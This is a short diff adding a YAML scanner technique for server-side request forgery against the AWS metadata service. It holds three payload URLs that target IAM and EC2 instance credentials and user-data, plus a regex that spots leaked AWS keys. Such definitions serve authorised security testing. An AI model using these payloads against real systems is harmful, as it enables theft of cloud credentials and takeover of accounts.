@@ -1,0 +1,20 @@
+techniques:
+  - id: ssrf_cloud_aws
+    name: "SSRF - AWS Cloud Metadata"
+    vuln_type: ssrf
+    description: "AWS-specific SSRF for IAM credential theft"
+    severity: critical
+    technology: ["aws"]
+    depth: standard
+    tags: ["ssrf", "cloud", "aws"]
+    payloads:
+      - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        description: "AWS IAM role listing"
+      - value: "http://169.254.169.254/latest/user-data"
+        description: "AWS user-data (may contain secrets)"
+      - value: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
+        description: "EC2 instance credentials"
+    detection:
+      - type: regex
+        value: "AccessKeyId|SecretAccessKey"
+        description: "AWS credentials exposed"
